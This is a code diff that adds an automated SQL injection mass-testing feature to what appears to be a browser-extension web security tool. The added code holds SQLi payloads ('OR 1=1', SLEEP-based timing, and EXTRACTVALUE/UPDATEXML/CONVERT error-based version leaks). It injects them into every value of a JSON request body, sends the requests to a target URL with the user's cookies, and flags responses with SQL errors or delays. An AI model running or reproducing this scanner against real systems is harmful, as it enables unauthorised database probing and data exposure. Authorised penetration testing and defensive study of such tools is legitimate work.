@@ -591,9 +591,359 @@ document.getElementById("testerBody")?.addEventListener("blur", () => {
     }
 });
 
+// =====================================================================
+// 5) JSON KEYS SQLi MASS-TEST
+// =====================================================================
+const JSON_DETECTION_PAYLOADS = [
+    { name: "Single Quote", payload: "'" },
+    { name: "OR 1=1", payload: "' OR 1=1--" },
+    { name: "AND SLEEP(5)", payload: "' AND SLEEP(5)--" },
+    { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
+    { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
+    { name: "CONVERT MSSQL", payload: "' AND 1=CONVERT(int,@@version)--" },
+];
 
+let jsonTestAbort = false;
 
+/** Collect leaf (or all scalar) paths from a JSON value */
+function collectJsonLeafPaths(obj, prefix, leafOnly, out) {
+    out = out || [];
+    if (obj === null || obj === undefined) {
+        if (prefix) out.push({ path: prefix, value: obj, type: "null" });
+        return out;
+    }
+    const ty = typeof obj;
+    if (ty !== "object") {
+        if (prefix) out.push({ path: prefix, value: obj, type: ty });
+        return out;
+    }
+    if (Array.isArray(obj)) {
+        if (!obj.length && prefix && !leafOnly) {
+            out.push({ path: prefix, value: [], type: "array" });
+        }
+        obj.forEach((item, i) => {
+            const p = prefix ? prefix + "[" + i + "]" : "[" + i + "]";
+            collectJsonLeafPaths(item, p, leafOnly, out);
+        });
+        return out;
+    }
+    const keys = Object.keys(obj);
+    if (!keys.length && prefix && !leafOnly) {
+        out.push({ path: prefix, value: {}, type: "object" });
+    }
+    keys.forEach((k) => {
+        const p = prefix ? prefix + "." + k : k;
+        collectJsonLeafPaths(obj[k], p, leafOnly, out);
+    });
+    return out;
+}
 
+/** Deep-clone and APPEND payload to ONE value only.
+ *  - Keys are never touched
+ *  - Only the value at `path` gets: originalValue + payload
+ *  - All other fields stay unchanged
+ */
+function setJsonPathValue(root, path, payload) {
+    const clone = JSON.parse(JSON.stringify(root));
+    if (!path) return clone;
+
+    const tokens = [];
+    const re = /([^[.\]]+)|\[(\d+)\]/g;
+    let m;
+    while ((m = re.exec(path)) !== null) {
+        if (m[1] !== undefined) tokens.push(m[1]);
+        else tokens.push(parseInt(m[2], 10));
+    }
+    if (!tokens.length) return clone;
+
+    let cur = clone;
+    for (let i = 0; i < tokens.length - 1; i++) {
+        const tok = tokens[i];
+        if (cur == null || typeof cur !== "object") return clone;
+        cur = cur[tok];
+    }
+    const last = tokens[tokens.length - 1];
+    if (cur != null && typeof cur === "object") {
+        const old = cur[last];
+        cur[last] = String(old == null ? "" : old) + String(payload);
+    }
+    return clone;
+}
+
+function fetchJsonTestOnce(url, method, body, headers, sendCookies) {
+    return new Promise((resolve) => {
+        try {
+            browser.runtime.sendMessage(
+                {
+                    action: "fetchUrl",
+                    url,
+                    method,
+                    headers: headers || {},
+                    body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
+                    credentials: sendCookies ? "include" : "omit"
+                },
+                (r) => {
+                    if (browser.runtime.lastError) {
+                        resolve({ ok: false, error: browser.runtime.lastError.message });
+                        return;
+                    }
+                    resolve(r || { ok: false, error: "Empty response" });
+                }
+            );
+        } catch (e) {
+            resolve({ ok: false, error: String(e && e.message || e) });
+        }
+    });
+}
+
+function renderJsonTestResults(results) {
+    const box = document.getElementById("jsonTestResults");
+    if (!box) return;
+
+    if (!results.length) {
+        box.innerHTML = `<div style="color:#888">${typeof t === "function" ? t("jsontest.noResults") : "Keine Ergebnisse."}</div>`;
+        box.style.display = "block";
+        return;
+    }
+
+    const interesting = results.filter((r) => {
+        if (!r.ok) return true;
+        const hasError = /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation|extractvalue|updatexml/i.test(r.body || "");
+        return hasError || (r.ms > 4000);
+    });
+
+    const resultsLabel = typeof t === "function"
+        ? t("jsontest.results", { total: results.length, interesting: interesting.length })
+        : `${results.length} Tests · ${interesting.length} interessant`;
+
+    let html = `<div style="font-size:12px;margin-bottom:6px">
+        <b>${results.length}</b> ·
+        <span style="color:${interesting.length ? "#fbbf24" : "#4ade80"}">${resultsLabel}</span>
+    </div>`;
+
+    html += `<div style="max-height:280px;overflow:auto;border:1px solid var(--border,#1a2f25);border-radius:6px;padding:6px 8px;font-size:11px;font-family:ui-monospace,monospace">`;
+
+    results.forEach((r, i) => {
+        const orig = r.originalValue == null ? "null" : String(r.originalValue);
+        const origShort = orig.length > 28 ? orig.substring(0, 25) + "…" : orig;
+        const plShort = (r.payloadName || r.payload || "").substring(0, 24);
+        const label = `${r.path} = ${origShort} + ${plShort}${(r.payload || "").length > 24 ? "…" : ""}`;
+
+        let color = "#888";
+        let badge = "clean";
+        if (!r.ok) {
+            color = "#f87171";
+            badge = "error";
+        } else if (/sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation|extractvalue|updatexml/i.test(r.body || "")) {
+            color = "#f87171";
+            badge = "HIGH";
+        } else if (r.ms > 4000) {
+            color = "#fbbf24";
+            badge = "TIME";
+        }
+
+        html += `<div style="padding:4px 0;border-bottom:1px solid #1a2f25;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+            <span style="color:${color};font-weight:600;min-width:48px">[${badge}]</span>
+            <span style="flex:1;word-break:break-all" title="${escapeHtml(r.path + ' | orig: ' + orig + ' | payload: ' + (r.payload || ''))}">${escapeHtml(label)}</span>
+            <span style="color:#666">${r.status || "-"} · ${r.ms}ms · ${(r.body || "").length}B</span>
+            <button class="btn-secondary jsont-load-btn" data-idx="${i}" style="font-size:10px;padding:2px 6px">→ Body</button>
+        </div>`;
+    });
+
+    html += `</div>`;
+    box.innerHTML = html;
+    box.style.display = "block";
+
+    box.querySelectorAll(".jsont-load-btn").forEach((btn) => {
+        btn.addEventListener("click", () => {
+            const r = results[parseInt(btn.dataset.idx, 10)];
+            if (!r) return;
+            const ta = document.getElementById("testerBody");
+            if (ta && r.injectedBody) {
+                ta.value = r.injectedBody;
+                const oj = document.getElementById("optBodyJson");
+                if (oj) oj.checked = true;
+            }
+            if (r.ok && typeof renderResponseView === "function") {
+                renderResponseView(
+                    document.getElementById("testerResponse"),
+                    r.status, "", [], r.body || ""
+                );
+            }
+            if (typeof analyzeSqliResponse === "function") {
+                analyzeSqliResponse(r.body || "", r.status, (r.body || "").length, r.ms);
+            }
+            log((typeof t === "function" ? t("jsontest.loaded") : "JSON-Key-Test geladen:") + " " + r.path);
+        });
+    });
+}
+
+async function runJsonKeysSqliTest() {
+    const btn = document.getElementById("testAllJsonKeysBtn");
+    const abortBtn = document.getElementById("jsonTestAbortBtn");
+    const progress = document.getElementById("jsonTestProgress");
+    const resultsBox = document.getElementById("jsonTestResults");
+
+    const baseUrl = (document.getElementById("urlInput")?.value || "").trim();
+    if (!baseUrl) {
+        log(typeof t === "function" ? t("jsontest.noUrl") : "Keine URL vorhanden", "warn");
+        return;
+    }
+
+    const bodyText = (document.getElementById("testerBody")?.value || "").trim();
+    if (!bodyText || !(bodyText.startsWith("{") || bodyText.startsWith("["))) {
+        log(typeof t === "function" ? t("jsontest.noJson") : "Kein gültiges JSON im Body", "warn");
+        return;
+    }
+
+    let root;
+    try {
+        root = JSON.parse(bodyText);
+    } catch (e) {
+        log((typeof t === "function" ? t("jsontest.noJson") : "Kein gültiges JSON:") + " " + e.message, "warn");
+        return;
+    }
+
+    const leafOnly = document.getElementById("jsonTestLeafOnly")?.checked ?? true;
+    const leaves = collectJsonLeafPaths(root, "", leafOnly, []);
+    if (!leaves.length) {
+        log(typeof t === "function" ? t("jsontest.noKeys") : "Keine testbaren JSON-Keys gefunden", "warn");
+        return;
+    }
+
+    const useCurrentPayload = document.getElementById("jsonTestUsePayload")?.checked ?? false;
+    let payloads = [];
+    if (useCurrentPayload) {
+        const p = (document.getElementById("customPayload")?.value || "").trim();
+        if (!p) {
+            log(typeof t === "function" ? t("jsontest.emptyPayload") : "Aktueller Payload ist leer", "warn");
+            return;
+        }
+        payloads = [{ name: "Custom", payload: p }];
+    } else {
+        payloads = JSON_DETECTION_PAYLOADS;
+    }
+
+    const method = (document.getElementById("testerMethod")?.value || "POST").toUpperCase();
+    const sendCookies = document.getElementById("optSendCookies")?.checked ?? true;
+    const sendHeaders = document.getElementById("optSendHeaders")?.checked ?? true;
+    const headerText = document.getElementById("testerHeaders")?.value || "";
+    const headers = {};
+    if (sendHeaders) {
+        headerText.split("\n").forEach((line) => {
+            const parts = line.split(":");
+            if (parts.length > 1) {
+                const key = parts.shift().trim();
+                if (key && key.toLowerCase() !== "cookie") headers[key] = parts.join(":").trim();
+            }
+        });
+    }
+    const hasCT = Object.keys(headers).some((k) => k.toLowerCase() === "content-type");
+    if (!hasCT) headers["Content-Type"] = "application/json";
+
+    jsonTestAbort = false;
+    if (btn) btn.disabled = true;
+    if (abortBtn) abortBtn.style.display = "inline-block";
+    const total = leaves.length * payloads.length;
+    if (progress) {
+        progress.style.display = "block";
+        progress.textContent = typeof t === "function"
+            ? t("jsontest.starting", { total })
+            : `Starte… 0 / ${total}  (${leaves.length} Keys × ${payloads.length} Payloads)`;
+    }
+    if (resultsBox) resultsBox.style.display = "none";
+
+    showJsonExplorer(bodyText);
+    log(`JSON-Key-Test: ${leaves.length} Values einzeln (Payload anhängen), ${payloads.length} Payload(s)`);
+
+    const allResults = [];
+    let done = 0;
+
+    // Jeder Value einzeln: pro Request wird NUR an diesen einen Value angehängt
+    for (const leaf of leaves) {
+        if (jsonTestAbort) break;
+        for (const p of payloads) {
+            if (jsonTestAbort) break;
+
+            let injectedObj;
+            try {
+                injectedObj = setJsonPathValue(root, leaf.path, p.payload);
+            } catch (e) {
+                allResults.push({
+                    path: leaf.path,
+                    originalValue: leaf.value,
+                    payload: p.payload,
+                    payloadName: p.name,
+                    ok: false,
+                    error: String(e.message || e),
+                    status: 0,
+                    body: "",
+                    ms: 0,
+                    injectedBody: ""
+                });
+                done++;
+                continue;
+            }
+            const injectedBody = JSON.stringify(injectedObj);
+
+            const start = performance.now();
+            const resp = await fetchJsonTestOnce(baseUrl, method, injectedBody, headers, sendCookies);
+            const ms = resp.ms || Math.round(performance.now() - start);
+
+            allResults.push({
+                path: leaf.path,
+                originalValue: leaf.value,
+                payload: p.payload,
+                payloadName: p.name,
+                ok: !!resp.ok,
+                status: resp.status,
+                body: resp.body || "",
+                ms,
+                error: resp.error,
+                injectedBody
+            });
+            done++;
+
+            if (progress) {
+                const origHint = leaf.value == null ? "null" : String(leaf.value).substring(0, 20);
+                progress.textContent = typeof t === "function"
+                    ? t("jsontest.progress", { done, total, name: leaf.path })
+                    : `Teste… ${done} / ${total}  (${leaf.path}=${origHint} + payload)`;
+            }
+
+            await new Promise((r) => setTimeout(r, 100));
+        }
+    }
+
+    if (btn) btn.disabled = false;
+    if (abortBtn) abortBtn.style.display = "none";
+    if (progress) {
+        progress.textContent = jsonTestAbort
+            ? (typeof t === "function" ? t("jsontest.aborted", { done, total }) : `Abgebrochen nach ${done}/${total}`)
+            : (typeof t === "function" ? t("jsontest.done", { done }) : `Fertig: ${done} Tests`);
+    }
+
+    renderJsonTestResults(allResults);
+
+    const hits = allResults.filter(
+        (r) => r.ok && /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation/i.test(r.body || "")
+    ).length;
+    log(
+        typeof t === "function"
+            ? t("jsontest.finished", { total: allResults.length, hits })
+            : `JSON-Key-SQLi-Test fertig: ${allResults.length} Requests, ${hits} mögliche Treffer`,
+        hits ? "warn" : "success"
+    );
+}
+
+document.getElementById("testAllJsonKeysBtn")?.addEventListener("click", () => {
+    runJsonKeysSqliTest();
+});
+
+document.getElementById("jsonTestAbortBtn")?.addEventListener("click", () => {
+    jsonTestAbort = true;
+    log(typeof t === "function" ? t("jsontest.aborting") : "JSON-Key-Test wird abgebrochen…");
+});
 
     function initParams() {
         // Event listeners are already in the extracted bodies.
@@ -610,5 +960,6 @@ document.getElementById("testerBody")?.addEventListener("blur", () => {
     global.renderPageParamList = renderPageParamList;
     global.netParamMap = netParamMap;
     global.showJsonExplorer = showJsonExplorer;
+    global.runJsonKeysSqliTest = runJsonKeysSqliTest;
 
 })(typeof window !== "undefined" ? window : this);
